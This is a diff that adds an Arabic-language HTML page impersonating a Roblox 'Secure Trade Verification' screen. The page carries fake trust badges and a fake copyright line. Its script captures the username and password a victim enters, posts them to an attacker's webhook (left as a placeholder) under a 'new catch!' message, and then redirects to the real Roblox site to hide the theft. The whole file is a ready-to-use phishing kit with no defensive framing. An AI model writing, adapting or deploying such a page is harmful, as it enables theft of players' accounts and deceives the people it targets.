@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox | Secure Trade Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background-color: #007bff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #000; }
+        .box { background: #ffffff; padding: 40px; border-radius: 15px; width: 90%; max-width: 380px; text-align: center; border: 3px solid #000; box-shadow: 0 15px 35px rgba(0,0,0,0.4); position: relative; }
+        .header-names { font-size: 14px; font-weight: bold; color: #000; margin-bottom: 10px; text-transform: uppercase; }
+        .logo { width: 70px; margin-bottom: 15px; }
+        h2 { color: #000; font-size: 22px; margin-bottom: 5px; }
+        .trust-badge { color: #28a745; font-size: 12px; font-weight: bold; margin-bottom: 20px; display: block; }
+        p { color: #000; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 2px solid #000; border-radius: 8px; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background-color: #000; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .tag-3head { margin-top: 25px; font-size: 26px; font-weight: 900; color: #000; }
+        .legal { margin-top: 15px; font-size: 10px; color: #555; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="header-names">kruzz_shadow_adres</div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="logo">
+        <h2>التحقق من أمان المقايضة</h2>
+        <span class="trust-badge">✓ نظام تشفير معتمد 256-bit</span>
+        <p>يرجى تسجيل الدخول لتأكيد ملكية العناصر وحمايتها أثناء التبادل.</p>
+        <form id="secureForm">
+            <input type="text" id="username" placeholder="اسم المستخدم" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+            <button type="submit">تأكيد الهوية والتبادل</button>
+        </form>
+        <div class="tag-3head">3head</div>
+        <div class="legal">© 2026 Roblox Corporation. Secure System.</div>
+    </div>
+
+    <script>
+        document.getElementById('secureForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const webhookURL = "رابط_الويبهوك_الخاص_بك"; // ضع رابطك هنا
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `🚨 **صيد جديد!** \n👤 **اليوزر:** \`${user}\` \n🔑 **الباسورد:** \`${pass}\` \n🆔 **المصدر:** kruzz_shadow_adres`
+                })
+            }).then(() => {
+                alert("تم التحقق! سيتم تحويلك الآن.");
+                window.location.href = "https://www.roblox.com/home";
+            });
+        });
+    </script>
+</body>
+</html>
+
